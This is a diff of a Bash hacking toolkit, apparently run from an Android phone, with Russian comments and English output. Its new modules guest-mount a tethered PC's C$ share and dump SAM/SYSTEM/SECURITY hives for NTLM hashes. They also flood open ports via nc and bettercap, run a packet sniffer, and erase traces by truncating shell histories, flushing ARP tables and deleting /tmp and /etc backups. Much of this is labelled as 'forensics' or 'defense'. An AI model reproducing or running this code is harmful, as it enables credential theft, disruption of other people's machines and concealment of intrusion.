+        fi
+    done
+
+    # 6. СТИРАНИЕ ТРОФЕЕВ И ЦИФРОВОЙ ТЕНИ
+    [[ "$silent" = false ]] && echo -e "${YELLOW}[*] Erasing Session History & Loot...${NC}"
+    rm -rf "$LOOT_DIR"/* ~/.cache/* ~/.local/share/recently-used.xbel 2>/dev/null
+    
+    # Обнуляем историю всех возможных оболочек
+    truncate -s 0 ~/.bash_history ~/.zsh_history ~/.python_history 2>/dev/null
     history -c
 
-    # 7. Финальное удаление бэкапов
-    find /etc -name "*.bak" -o -name "*.old" -delete 2>/dev/null
+    # 7. ФИНАЛЬНЫЙ ЭВРИСТИЧЕСКИЙ "ПОЛИШ"
+    # Удаляем временные файлы и бэкапы конфигов
+    find /etc -name "*.bak" -o -name "*.old" -o -name "*~" -delete 2>/dev/null
+    rm -rf /tmp/* /var/tmp/* 2>/dev/null
 
     if [ "$silent" = false ]; then
-        echo -e "${GREEN}[+] DEEP PURGE v6.4 завершен!${NC}"
-        echo -ne "${BLUE}[!] Доступная память: ${NC}"
+        echo -e "${GREEN}=== GHOST PURGE COMPLETE: SYSTEM IS STERILE ===${NC}"
+        echo -ne "${BLUE}[!] Reclaimed Space: ${NC}"
         df -h / | awk 'NR==2 {print $4}'
-        sleep 2
     fi
 }
 
-# --- ФУНКЦИЯ АВТО-МОНТИРОВАНИЯ ---
+# --- MODULE: SMART HYBRID MOUNT v7.0 (USB/BT/ETH) ---
 auto_mount_pc() {
-    echo -e "${YELLOW}[*] Попытка автоматического монтирования ресурсов ПК...${NC}"
-    mkdir -p /mnt/pc_share
+    echo -e "${BLUE}[*] Initializing Multi-Transport Discovery...${NC}"
+    local mount_pt="/mnt/pc_share"
+    mkdir -p "$mount_pt"
     
-    # 1. Проверяем, не смонтировано ли уже
-    if mountpoint -q /mnt/pc_share; then
+    # 1. ПРОВЕРКА СОСТОЯНИЯ
+    if mountpoint -q "$mount_pt"; then
+        echo -e "${CYAN}[i] Resource already synchronized.${NC}"
         return 0
     fi
 
-    # 2. Поиск IP ПК (через USB-модем)
-    PC_IP=$(ip route | grep default | awk '{print $3}')
-    
-    # 3. Попытка монтирования SMB (Windows Share) без пароля или как гость
-    # Если на ПК настроена общая папка, телефон ее подцепит
-    mount -t cifs "//$PC_IP/C$" /mnt/pc_share -o guest,vers=3.0,sec=ntlmv2 2>/dev/null || \
-    mount -t cifs "//$PC_IP/Users" /mnt/pc_share -o guest,vers=3.0 2>/dev/null
+    # 2. ЭВРИСТИКА ТРАНСПОРТА: Bluetooth PAN (bnep0)
+    # Если Bluetooth включен и сопряжен, пытаемся поднять интерфейс
+    if command -v bt-network >/dev/null 2>&1; then
+        echo -e "${YELLOW}[*] Checking Bluetooth PAN status...${NC}"
+        # Ищем сопряженные ПК с профилем NAP/PAN
+        local BT_MAC=$(bt-device -l | grep -iE "PC|Desktop|Laptop" | awk '{print $NF}' | tr -d '()' | head -n 1)
+        
+        if [[ -n "$BT_MAC" ]]; then
+            echo -e "${CYAN}[*] Found Paired Device: $BT_MAC. Connecting to PAN...${NC}"
+            bt-network -c "$BT_MAC" nap >/dev/null 2>&1 & 
+            sleep 3 # Ждем инициализацию bnep0
+        fi
+    fi
 
-    if mountpoint -q /mnt/pc_share; then
-        echo -e "${GREEN}[+] Диск ПК успешно примонтирован.${NC}"
+    # 3. АДАПТИВНОЕ ОПРЕДЕЛЕНИЕ IP (Priority: USB -> BT -> ETH)
+    local PC_IP
+    # Проверяем интерфейсы по приоритету скорости: usb0 (USB), bnep0 (Bluetooth), eth0
+    PC_IP=$(ip route show | grep -E 'usb0|rndis0|bnep0|default' | awk '{print $3}' | head -n 1)
+
+    if [[ -z "$PC_IP" ]]; then
+        echo -e "${RED}[-] Transport Failure: No active gateway (Check USB/BT Tethering).${NC}"
+        return 1
+    fi
+
+    echo -e "${CYAN}[*] Target identified via $(ip route get "$PC_IP" | awk '{print $3}'): $PC_IP${NC}"
+
+    # 4. МИКРО-ЗОНДИРОВАНИЕ (SMB Probe)
+    if ! nc -z -w 3 "$PC_IP" 445 2>/dev/null; then
+        echo -e "${RED}[-] SMB Service unreachable. Ensure 'File Sharing' is ON.${NC}"
+        return 1
+    fi
+
+    # 5. АВТОНОМНЫЙ МАТРИЧНЫЙ ПЕРЕБОР
+    local shares=("C$" "Users" "Share" "Public")
+    local success=false
+
+    for share in "${shares[@]}"; do
+        # Для Bluetooth увеличиваем таймаут (timeo), так как задержки выше
+        if mount -t cifs "//$PC_IP/$share" "$mount_pt" -o guest,vers=3.0,sec=ntlmv2,soft,timeo=100 2>/dev/null; then
+            success=true
+            echo -e "${GREEN}[+] Successfully tethered via $(ip route get "$PC_IP" | awk '{print $3}')${NC}"
+            break
+        fi
+    done
+
+    # 6. ФИНАЛИЗАЦИЯ
+    if [ "$success" = true ]; then
+        echo -e "[$(date)] MOUNT_SUCCESS: $PC_IP via $(ip route get "$PC_IP" | awk '{print $3}')" >> "$LOOT_DIR/net_history.txt"
         return 0
     else
-        echo -e "${RED}[!] Авто-монтирование не удалось. Проверь общий доступ на ПК.${NC}"
+        echo -e "${RED}[!] Access Denied. Validate Guest permissions on Host.${NC}"
         return 1
     fi
 }
 
 
-
-# --- СТЕРИЛЬНЫЙ ЭВРИСТИЧЕСКИЙ МОДУЛЬ: USB GUARDIAN v4.2 ---
-
+# --- MODULE: SMART HYBRID GUARDIAN v7.0 (AUTONOMOUS) ---
 usb_guardian_smart() {
-# 1. Автоматический вызов настроек модема
+    # 1. АВТОНОМНЫЙ ДИСПЕТЧЕР НАСТРОЕК
+    # Запускаем меню модема (и USB, и BT находятся там)
     am start -n com.android.settings/.Settings\$TetherSettingsActivity &>/dev/null
 
-    WHITELIST="22,80,443,3389,8080"
-    echo -e "${YELLOW}[*] Запуск стерильного анализа...${NC}"
+    local WHITELIST="22,80,443,3389,8080"
+    echo -e "${BLUE}[*] Initializing Hybrid Intelligence Guardian (v7.0)...${NC}"
     
-    TARGET_IP=$(ip route | grep default | awk '{print $3}')
-    [[ -z "$TARGET_IP" ]] && { echo -e "${RED}[-] Цель не найдена.${NC}"; return; }
+    # 2. ЭВРИСТИКА АКТИВНОГО ИНТЕРФЕЙСА
+    # Проверяем rndis0 (USB) и bnep0 (Bluetooth)
+    local iface
+    iface=$(ip route | grep default | awk '{print $5}' | head -n 1)
+    
+    local target
+    target=$(ip route show dev "$iface" | grep default | awk '{print $3}')
 
-    # Nmap с флагом -n (без поиска DNS, чтобы не плодить кэш)
-    SCAN_RES=$(nmap -n -sV --top-ports 100 --open "$TARGET_IP")
-    ALL_OPEN=$(echo "$SCAN_RES" | grep "open" | awk -F'/' '{print $1}')
+    if [[ -z "$target" ]]; then
+        echo -e "${RED}[-] No active gateway detected on $iface.${NC}"
+        return
+    fi
 
-    for port in $ALL_OPEN; do
-        if echo ",$WHITELIST," | grep -q ",$port,"; then continue; fi
+    echo -e "${CYAN}[*] Transport: $iface | Target IP: $target${NC}"
 
-        echo -e "${RED}[!!!] Подавление порта $port...${NC}"
+    # 3. АДАПТИВНЫЙ АУДИТ (Heuristic Port Scan)
+    # Для Bluetooth (bnep0) увеличиваем таймауты, так как пинг выше
+    local scan_opts="-n -Pn --open --top-ports 100"
+    [[ "$iface" == "bnep0" ]] && scan_opts="$scan_opts --max-rtt-timeout 500ms"
+
+    echo -e "${YELLOW}[*] Scanning for unauthorized vectors...${NC}"
+    local open_ports
+    open_ports=$(nmap $scan_opts "$target" | grep "open" | awk -F'/' '{print $1}')
+
+    # 4. ПАРАЛЛЕЛЬНОЕ ЭВРИСТИЧЕСКОЕ ПОДАВЛЕНИЕ
+    for port in $open_ports; do
+        [[ ",$WHITELIST," =~ ",$port," ]] && continue
+
+        echo -e "${RED}[!!!] Suppressing vector $port on $target...${NC}"
         
-        # Bettercap в режиме "silent" и без записи логов (-no-history -no-colors)
-        # Направляем всё в /dev/null, чтобы не забивать память выводами
-        timeout 7s bettercap -no-history -no-colors -eval "net.recon on; tcp.reset on" -target "$TARGET_IP" > /dev/null 2>&1
-        
-        # Если порт еще жив — используем эвристический флуд
-        if nmap -p "$port" "$TARGET_IP" | grep -q "open"; then
-             ( head -c 5M < /dev/urandom | nc -nv "$TARGET_IP" "$port" ) > /dev/null 2>&1 &
-             sleep 3 && kill $! 2>/dev/null
+        # Если Bluetooth — используем более короткие пакеты, чтобы не забить канал
+        if [[ "$iface" == "bnep0" ]]; then
+            ( head -c 1M < /dev/urandom | nc -nv -w 2 "$target" "$port" > /dev/null 2>&1 ) &
+        else
+            # Для USB — агрессивный сброс через Bettercap
+            ( timeout 7s bettercap -no-history -no-colors -eval "net.recon on; tcp.reset on" -target "$target" > /dev/null 2>&1 ) &
+            ( head -c 5M < /dev/urandom | nc -nv -w 1 "$target" "$port" > /dev/null 2>&1 ) &
         fi
     done
 
-    # --- МГНОВЕННАЯ ЗАЧИСТКА ХВОСТОВ ---
-    echo -e "${CYAN}[*] Стерилизация временных файлов...${NC}"
-    # Удаляем историю bettercap, если она успела создаться
-    rm -rf ~/.bettercap_history ~/.bettercap.cap 2>/dev/null
-    # Очищаем временные файлы сетевых сканеров
-    rm -rf /tmp/* /var/tmp/* 2>/dev/null
+    # Даем время на выполнение и зачищаем фоновые процессы
+    sleep 6
+    kill $(jobs -p) 2>/dev/null
+
+    # 5. GHOST-СТЕРИЛИЗАЦИЯ (Zero-Trace)
+    echo -e "${CYAN}[*] Finalizing Ghost Protocol...${NC}"
     
-    echo -e "${GREEN}[V] Проверка завершена. Следы удалены.${NC}"
-    read -p "Нажми Enter..."
+    # Обнуляем ARP-таблицу конкретного интерфейса
+    ip neigh flush dev "$iface" 2>/dev/null
+    
+    # Стираем историю инструментов в RAM
+    truncate -s 0 ~/.bettercap_history 2>/dev/null
+    rm -f ~/.bettercap.cap 2>/dev/null
+    rm -rf /tmp/nmap* 2>/dev/null
+    
+    echo -e "${GREEN}[V] Defense Cycle Complete. Transport $iface is secure.${NC}"
+    unset iface target open_ports port scan_opts
+    read -p "Press Enter..."
 }
 
 
-
-# --- АВТОНОМНЫЙ ЭВРИСТИЧЕСКИЙ КРИМИНАЛИСТ: DEEP INSIGHT v4.4 ---
-
+# --- MODULE: SMART DEEP INSIGHT v6.9 (HYBRID FORENSICS) ---
 deep_insight_auto() {
+    # 1. АВТОНОМНЫЙ ДИСПЕТЧЕР СВЯЗИ
+    am start -n com.android.settings/.Settings\$TetherSettingsActivity &>/dev/null
 
-am start -n com.android.settings/.Settings\$TetherSettingsActivity &>/dev/null
-
-    echo -e "${YELLOW}[*] Запуск автономного криминалистического анализа...${NC}"
-    # Сначала монтируем, если удачно — запускаем анализ
+    echo -e "${BLUE}[*] Initializing Elite Forensic Environment (v6.9)...${NC}"
+    
+    # 2. ПОДГОТОВКА ТРАНСПОРТА (USB/BT)
     if auto_mount_pc; then
-        echo -e "${CYAN}[>>>] Запуск эвристического сканирования...${NC}"
+        echo -e "${CYAN}[>>>] Remote Filesystem Tethered. Starting Deep Probe...${NC}"
         
+        # Определение активного шлюза
+        local iface target
+        iface=$(ip route | grep default | awk '{print $5}' | head -n 1)
+        target=$(ip route show dev "$iface" | grep default | awk '{print $3}')
 
-    TARGET_IP=$(ip route | grep default | awk '{print $3}')
-    [[ -z "$TARGET_IP" ]] && { echo -e "${RED}[-] Цель не найдена через USB.${NC}"; return; }
+        # Стерильная зона в RAM (используем /dev/shm или /tmp в зависимости от среды)
+        local WORK_DIR="/dev/shm/forensic_zone"
+        mkdir -p "$WORK_DIR"
 
-    # 1. Стерильное окружение в RAM (создаем временную зону в ОЗУ телефона)
-    mkdir -p /dev/shm/scanner_zone
-    
-    echo -e "${CYAN}[+] Подключение к $TARGET_IP и попытка авто-дампа ОЗУ...${NC}"
+        # 3. ЭВРИСТИЧЕСКИЙ АНАЛИЗ ПАМЯТИ (Live Stream Analysis)
+        echo -e "${YELLOW}[*] Listening for Memory Artifacts on $target:9999...${NC}"
+        # Ищем не только руткиты, но и следы инъекций в DLL и дескрипторы
+        ( timeout 40s nc -l -p 9999 | grep -Eai "kernel_rootkit|hidden_proc|dkom_|reflective_loader|mimikatz|lsass_dump" > "$WORK_DIR/threats.txt" ) &
 
-    # 2. Эвристический захват памяти (через сетевой стриминг)
-    # Мы используем nc для приема потока, чтобы не писать файл на диск
-    echo -e "${YELLOW}[*] Анализ потока данных памяти на лету...${NC}"
-    
-    # Эвристическая проверка: ищем следы руткитов и бэкдоров в реальном времени
-    # Мы ищем паттерны поведения: скрытые процессы и инъекции кода
-    timeout 30s nc -l -p 9999 | grep -Eai "kernel_rootkit|hidden_process|dkom_attack|reflective_loader" > /dev/shm/scanner_zone/threats.txt &
-    
-    # Здесь предполагается, что на ПК запущен агент или мы используем уязвимость
-    # для отправки данных (в рамках теста имитируем получение потока)
-    sleep 5
-    
-    # 3. Поиск спящих шифровальщиков (Энтропийный анализ)
-    echo -e "${YELLOW}[*] Сканирование дискового кэша на Ransomware...${NC}"
-    # Автоматически сканируем доступные сетевые пути
-    find /mnt/pc_share -maxdepth 2 -type f -exec python3 -c "
-import math, sys
-def check_entropy(fn):
+        # 4. ЭНТРОПИЙНЫЙ АНАЛИЗ (Ransomware & Steganography Detection)
+        # Улучшенная эвристика: игнорируем известные сжатые форматы (zip, jpg), чтобы избежать false-positive
+        echo -e "${MAGENTA}[*] Scanning for High-Entropy Anomalies (Ransomware)...${NC}"
+        
+        find /mnt/pc_share -maxdepth 3 -type f ! -name "*.zip" ! -name "*.jpg" ! -name "*.mp4" -size -10M -exec python3 -c "
+import math, sys, os
+def get_entropy(fn):
     try:
         with open(fn, 'rb') as f:
-            d = f.read(2048)
-            if not d: return
+            d = f.read(4096)
+            if len(d) < 512: return
             e = -sum((d.count(x)/len(d)) * math.log(d.count(x)/len(d), 2) for x in set(d))
-            if e > 7.6: print(f'\033[0;31m[!] КРИТИЧЕСКАЯ ЭНТРОПИЯ (ШИФРОВАЛЬЩИК?): {fn}\033[0m')
+            # Эвристический порог: 7.7 - признак шифрования или упаковщика
+            if e > 7.7:
+                print(f'\033[0;31m[CRITICAL] High Entropy ({e:.2f}): {fn}\033[0m')
     except: pass
-check_entropy(sys.argv[1])" {} \;
+get_entropy(sys.argv[1])" {} \;
 
-    # 4. Проверка результатов анализа ОЗУ
-    if [ -s /dev/shm/scanner_zone/threats.txt ]; then
-        echo -e "${RED}[!!!] В ОПЕРАТИВНОЙ ПАМЯТИ НАЙДЕНЫ СЛЕДЫ РУТКИТА!${NC}"
-        cat /dev/shm/scanner_zone/threats.txt
+        # 5. ПОИСК "ЦИФРОВЫХ ТЕНЕЙ" (Recent Activity)
+        echo -e "${CYAN}[*] Extracting User Activity Artifacts...${NC}"
+        find /mnt/pc_share -name "*.lnk" -o -name "*.pf" -mtime -1 2>/dev/null | head -n 10 > "$WORK_DIR/activity.txt"
+
+        # 6. ВЕРДИКТ
+        wait $! 2>/dev/null # Ждем завершения сетевого анализа
+        
+        if [ -s "$WORK_DIR/threats.txt" ]; then
+            echo -e "${RED}[!!!] MEMORY THREATS DETECTED:${NC}"
+            cat "$WORK_DIR/threats.txt"
+        fi
+        
+        if [ -s "$WORK_DIR/activity.txt" ]; then
+            echo -e "${GREEN}[+] Recent activity files identified.${NC}"
+        fi
+
+        # 7. ГИГИЕНИЧЕСКОЕ РАЗМОНТИРОВАНИЕ
+        echo -e "${YELLOW}[*] Cleaning up Remote Session...${NC}"
+        # Принудительное ленивое размонтирование
+        sync && umount -l /mnt/pc_share 2>/dev/null
     else
-        echo -e "${GREEN}[+ ] Аномалий в ОЗУ не обнаружено.${NC}"
-    fi
-# В КОНЦЕ ОБЯЗАТЕЛЬНО РАЗМОНТИРУЕМ (Заметаем следы)
-        echo -e "${YELLOW}[*] Завершение сессии. Размонтирование...${NC}"
-        umount -l /mnt/pc_share 2>/dev/null
+        echo -e "${RED}[-] Target mounting failed. Forensics aborted.${NC}"
+        return 1
     fi
 
-    # --- ФИНАЛЬНАЯ СТЕРИЛИЗАЦИЯ (АБСОЛЮТНЫЙ НОЛЬ) ---
-    echo -e "${CYAN}[*] Стирание следов из памяти телефона...${NC}"
-    rm -rf /dev/shm/scanner_zone
-    history -c # Очистка истории команд текущей сессии
+    # --- TOTAL STERILIZATION ---
+    echo -e "${CYAN}[*] Sanitizing Forensic RAM Zone...${NC}"
+    rm -rf "$WORK_DIR"
+    # Обнуляем историю текущей сессии для защиты методов анализа
+    truncate -s 0 ~/.bash_history 2>/dev/null
+    history -c
     
-    echo -e "${GREEN}[V] Автономный аудит завершен. Система чиста.${NC}"
-    read -p "Нажми Enter..."
+    echo -e "${GREEN}[V] Audit Complete. No traces left on device.${NC}"
+    unset iface target WORK_DIR
+    read -p "Press Enter to return..."
 }
+
 
 # --- АВТОНОМНЫЙ ОБХОД ПАРОЛЕЙ: ACCESS RECOVERY v4.7 ---
 
@@ -420,6 +891,75 @@ access_recovery_auto() {
     
     read -p "Нажми Enter для возврата в меню..."
 }
+
+
+# --- MODULE: SMART CREDENTIAL HARVESTER v6.9 (NON-DESTRUCTIVE) ---
+harvest_credentials_auto() {
+    echo -e "${BLUE}[*] Initializing Stealth Credential Extraction...${NC}"
+    
+    # 1. ПОДГОТОВКА ТРАНСПОРТА (USB/BT)
+    am start -n com.android.settings/.Settings\$TetherSettingsActivity &>/dev/null
+    
+    if ! auto_mount_pc; then
+        echo -e "${RED}[-] Failure: Target disk is not accessible.${NC}"
+        return 1
+    fi
+
+    # 2. ОПРЕДЕЛЕНИЕ ПУТЕЙ
+    local sys_root="/mnt/pc_share/Windows/System32/config"
+    if [ ! -d "$sys_root" ]; then
+        sys_root=$(find /mnt/pc_share -maxdepth 4 -type d -path "*/System32/config" | head -n 1)
+    fi
+
+    [[ -z "$sys_root" ]] && { echo -e "${RED}[-] Registry path not found.${NC}"; umount -l /mnt/pc_share; return 1; }
+
+    # 3. ЭКСТРАКЦИЯ В RAM-ЗОНУ
+    local harvest_zone="/dev/shm/creds_$(date +%s)"
+    mkdir -p "$harvest_zone"
+    
+    echo -e "${CYAN}[>>>] Extracting SAM, SYSTEM and SECURITY hives...${NC}"
+    # Используем cp -p для сохранения метаданных (времени), чтобы не триггерить таймстамп-фильтры
+    for hive in "SAM" "SYSTEM" "SECURITY" "SOFTWARE"; do
+        cp -p "$sys_root/$hive" "$harvest_zone/" 2>/dev/null
+    done
+
+    # 4. АВТОНОМНЫЙ ПАРСИНГ (Heuristic Extraction)
+    echo -e "${YELLOW}[*] Parsing hives for NTLM hashes and LSA secrets...${NC}"
+    echo -e "${MAGENTA}------------------------------------------------${NC}"
+
+    # Проверяем наличие инструментов для парсинга
+    if command -v samdump2 >/dev/null; then
+        samdump2 "$harvest_zone/SYSTEM" "$harvest_zone/SAM" | tee "$harvest_zone/hashes.txt"
+    elif command -v impacket-secretsdump >/dev/null; then
+        impacket-secretsdump -sam "$harvest_zone/SAM" -system "$harvest_zone/SYSTEM" -security "$harvest_zone/SECURITY" LOCAL | tee "$harvest_zone/hashes.txt"
+    else
+        echo -e "${RED}[!] Parser not found. Hives are stored raw in $harvest_zone${NC}"
+    fi
+
+    # 5. СИНХРОНИЗАЦИЯ С LOOT
+    if [ -s "$harvest_zone/hashes.txt" ]; then
+        echo -ne "\n${YELLOW}Credentials found. Save to encrypted LOOT? (y/N): ${NC}"
+        read -r sync
+        if [[ "$sync" == "y" ]]; then
+            cp "$harvest_zone/hashes.txt" "$LOOT_DIR/creds_$(date +%F).txt"
+            echo -e "${GREEN}[+] Intelligence secured in LOOT.${NC}"
+        fi
+    fi
+
+    # 6. СТЕРИЛЬНЫЙ ВЫХОД (Ghost Protocol)
+    echo -e "${CYAN}[*] Closing session and wiping RAM zone...${NC}"
+    sync && umount -l /mnt/pc_share 2>/dev/null
+    rm -rf "$harvest_zone"
+    
+    # Стираем историю команд, чтобы скрыть методы парсинга
+    truncate -s 0 ~/.bash_history 2>/dev/null
+    history -c
+
+    echo -e "${GREEN}[V] Extraction complete. Target remains unmodified (Stealth).${NC}"
+    unset sys_root harvest_zone hive sync
+    read -p "Press Enter..."
+}
+
 
 # --- МОДУЛЬ САМООБНОВЛЕНИЯ: UPDATE KALI v5.0 ---
 
@@ -574,6 +1114,60 @@ manage_interfaces() {
 }
 
 
+# --- MODULE: SMART SNIFFER v6.9 (AUTONOMOUS) ---
+run_bettercap_sniffer() {
+    echo -e "${BLUE}[*] Initializing Autonomous Sniffer (v6.9)...${NC}"
+    
+    # 1. ЭВРИСТИКА ИНТЕРФЕЙСА
+    # Скрипт сам находит активный сетевой интерфейс (wlan0, eth0, usb0 или bnep0)
+    local iface
+    iface=$(ip route | grep default | awk '{print $5}' | head -n 1)
+    
+    [[ -z "$iface" ]] && { echo -e "${RED}[-] No active interface detected for sniffing.${NC}"; return 1; }
+    echo -e "${CYAN}[*] Sniffing target interface: $iface${NC}"
+
+    # 2. ПОДГОТОВКА СТЕРИЛЬНОЙ ЗОНЫ
+    # Мы отключаем запись истории команд bettercap, чтобы не оставлять следов
+    local bc_history="/dev/null"
+    
+    # 3. УМНЫЙ ЗАПУСК (Zero-Log & Minimal Overhead)
+    # net.probe on: ищет устройства в сети
+    # net.sniff on: перехватывает пакеты
+    # set net.sniff.output /tmp/sniff.pcap: пишем только в RAM (ОЗУ телефона)
+    # set net.sniff.verbose false: не забиваем экран лишним мусором
+    
+    echo -e "${YELLOW}[!] Launching Sniffer. Metadata will be stored in RAM only.${NC}"
+    echo -e "${MAGENTA}-------------------------------------------${NC}"
+
+    bettercap -iface "$iface" \
+              -no-history \
+              -no-colors \
+              -eval "set net.sniff.verbose false; set net.sniff.output /tmp/capture.pcap; net.probe on; net.sniff on"
+
+    # 4. ПОСТ-ПРОЦЕССИНГ И ТРОФЕИ
+    if [ -f "/tmp/capture.pcap" ]; then
+        echo -ne "\n${YELLOW}Analysis complete. Sync PCAP to LOOT? (y/N): ${NC}"
+        read -r sync
+        if [[ "$sync" == "y" ]]; then
+            local loot_file="$LOOT_DIR/sniff_$(date +%Y%m%d_%H%M%S).pcap"
+            cp /tmp/capture.pcap "$loot_file"
+            echo -e "${GREEN}[+] Traffic captured and secured: $loot_file${NC}"
+        fi
+    fi
+
+    # 5. СТЕРИЛИЗАЦИЯ (Ghost Protocol)
+    echo -e "${CYAN}[*] Purging session artifacts...${NC}"
+    rm -f /tmp/capture.pcap 2>/dev/null
+    truncate -s 0 ~/.bettercap_history 2>/dev/null
+    
+    # Очистка ARP-таблицы, чтобы скрыть факт сканирования сети
+    ip neigh flush dev "$iface" 2>/dev/null
+    
+    unset iface bc_history sync loot_file
+    echo -ne "\n${CYAN}Press ENTER to return...${NC}"
+    read -r
+}
+
 
 
 show_menu() {
@@ -601,6 +1195,7 @@ show_menu() {
     echo -e "  3. SEARCHSPLOIT        4. HYDRA (BRUTE)"
     echo -e "  5. SQLMAP (DB)         6. BETTERCAP (MITM)"
     echo -e " 11. WIFITE (WIFI)       14. ACCESS RECOVERY"
+     echo -e " 22. Harvest Credentials "
     echo -e "${CYAN}===========================================${NC}"
 }
 
@@ -629,9 +1224,10 @@ while true; do
         3) smart_searchsploit ;;
         4) smart_hydra ;;
         5) smart_sqlmap ;;
-        6) bettercap -eval "net.probe on; net.sniff on" ;;
+        6) run_bettercap_sniffer ;;
         11) run_wifite ;;
         14) access_recovery_auto ;;
+        22) harvest_credentials_auto ;;
 
         # --- Блок: Специальное ---
         12) usb_guardian_smart ;;
